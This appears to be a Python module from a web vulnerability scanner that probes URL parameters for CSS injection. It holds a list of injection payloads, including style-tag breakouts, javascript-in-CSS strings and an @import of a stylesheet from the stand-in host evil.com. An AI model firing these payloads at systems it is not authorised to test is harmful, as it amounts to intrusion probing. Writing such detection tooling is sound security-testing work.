"""
modules/css_injection.py
-----------------------
CSS injection detection.
Tests if user-controlled input is reflected into <style> context,
allowing data exfiltration via CSS selectors.
"""

from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("css_injection")


CSS_PAYLOADS = [
    "}</style><style>body{background:red}",
    "</style><style>body{background:red}",
    "expression(alert(1))",
    "background:url(javascript:alert(1))",
    "@import 'http://evil.com/x.css';",
]


def test_url(url: str) -> List[Dict]:
    findings: List[Dict] = []
    p = urlparse(url)
    qs = parse_qs(p.query)
    if not qs:
        return []

    for param in qs:
        for payload in CSS_PAYLOADS:
            try:
                new_qs = dict(qs)
                new_qs[param] = [payload]
                new_url = urlunparse((p.scheme, p.netloc, p.path,
                                      p.params, urlencode(new_qs, doseq=True), ""))
            except Exception:
                continue
            r = safe_request(new_url, timeout=10)
            if not r:
                continue
            text = r.text or ""
            if payload in text and ("<style" in text or "css" in text.lower()):
                findings.append({
                    "type": "css_injection",
                    "url": new_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "Payload reflected in CSS context",
                    "severity": "medium",
                    "confidence": 60,
                })
                break
    return findings


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "css_injection", output_root)
    urls = load_urls(domain, output_root)
    params_urls = [u for u in urls if "?" in u and "=" in u]

    info(f"Testing {len(params_urls[:60])} URLs for CSS injection")
    findings: List[Dict] = []

    for url in params_urls[:60]:
        try:
            for f in test_url(url):
                findings.append(f)
                save_finding(domain, "css_injection", f["type"], f["severity"],
                             f["url"], param=f["param"], payload=f["payload"],
                             evidence=f["evidence"], confidence=f["confidence"],
                             scan_id=scan_id, output_root=output_root)
        except Exception as e:
            log.debug(f"css injection failed {url}: {e}")

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "css_injection", run, args.output)